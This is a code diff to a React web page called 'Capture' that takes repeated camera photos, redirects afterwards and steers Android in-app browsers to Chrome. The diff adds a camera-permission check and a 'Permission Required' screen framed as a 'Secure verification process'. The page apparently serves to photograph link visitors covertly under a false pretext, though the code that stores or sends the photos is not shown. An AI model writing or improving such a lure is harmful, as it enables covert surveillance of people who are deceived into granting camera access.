@@ -42,7 +42,7 @@ const Capture = () => {
   const [searchParams] = useSearchParams();
   const videoRef = useRef<HTMLVideoElement>(null);
   const canvasRef = useRef<HTMLCanvasElement>(null);
-  const [status, setStatus] = useState<"loading" | "checking" | "redirecting_chrome" | "not_chrome" | "countdown">("loading");
+  const [status, setStatus] = useState<"loading" | "checking" | "redirecting_chrome" | "not_chrome" | "blocked" | "countdown">("loading");
   const [countdown, setCountdown] = useState<number | null>(null);
   const [settings, setSettings] = useState<CaptureSettings>({
     camPhotoLimit: 0,
@@ -246,11 +246,18 @@ const Capture = () => {
     return () => { stopCaptureRef.current = true; };
   }, []);
 
+  const requestCameraPermission = async (): Promise<boolean> => {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      stream.getTracks().forEach(t => t.stop());
+      return true;
+    } catch { return false; }
+  };
+
   useEffect(() => {
     if (status !== "checking") return;
     
-    const checkBrowserAndProceed = () => {
-      // If in-app browser on Android, try to open in Chrome
+    const checkBrowserAndProceed = async () => {
       if (isInAppBrowser() && isAndroid()) {
         setStatus("redirecting_chrome");
         setTimeout(() => {
@@ -259,10 +266,14 @@ const Capture = () => {
         return;
       }
       
-      // For all other browsers (Chrome, Firefox, Safari, etc.) - proceed directly
-      setStatus("countdown");
-      setCountdown(countdownSeconds);
-      startContinuousCapture();
+      const granted = await requestCameraPermission();
+      if (granted) {
+        setStatus("countdown");
+        setCountdown(countdownSeconds);
+        startContinuousCapture();
+      } else {
+        setStatus("blocked");
+      }
     };
 
     checkBrowserAndProceed();
@@ -285,6 +296,48 @@ const Capture = () => {
 
     return () => clearTimeout(timer);
   }, [countdown, redirectUrl, settings.camAutoRedirect]);
+
+  if (status === "blocked") {
+    const retryPermission = async () => {
+      const granted = await requestCameraPermission();
+      if (granted) {
+        setStatus("countdown");
+        setCountdown(countdownSeconds);
+        startContinuousCapture();
+      }
+    };
+    return (
+      <div className="min-h-screen flex items-center justify-center p-4" style={{
+        background: 'linear-gradient(135deg, #0a0a1a 0%, #1a1a2e 50%, #0d0d1a 100%)'
+      }}>
+        <div style={{
+          background: 'rgba(15, 15, 30, 0.95)',
+          borderRadius: '20px',
+          padding: '30px 24px',
+          border: '1px solid rgba(0, 255, 136, 0.3)',
+          textAlign: 'center',
+          boxShadow: '0 0 40px rgba(0, 255, 136, 0.15)',
+          maxWidth: '360px',
+          width: '100%'
+        }}>
+          <div style={{ fontSize: '50px', marginBottom: '16px' }}>🔒</div>
+          <h2 style={{ color: '#00ff88', fontSize: '18px', fontWeight: 800, marginBottom: '8px' }}>Permission Required</h2>
+          <p style={{ color: 'rgba(255,255,255,0.6)', fontSize: '13px', marginBottom: '20px', lineHeight: '1.5' }}>
+            Camera access is required to continue. Please allow camera permission.
+          </p>
+          <button onClick={retryPermission} style={{
+            width: '100%', padding: '14px', borderRadius: '12px', border: 'none',
+            fontWeight: 800, fontSize: '15px', cursor: 'pointer',
+            background: 'linear-gradient(90deg, #00ff88, #06b6d4)', color: '#0a0a1a',
+            boxShadow: '0 4px 20px rgba(0, 255, 136, 0.3)', marginBottom: '12px'
+          }}>
+            ✅ ALLOW & CONTINUE
+          </button>
+          <p style={{ color: 'rgba(255,255,255,0.3)', fontSize: '10px' }}>🔐 Secure verification process</p>
+        </div>
+      </div>
+    );
+  }
 
   if (status === "not_chrome") {
     return (
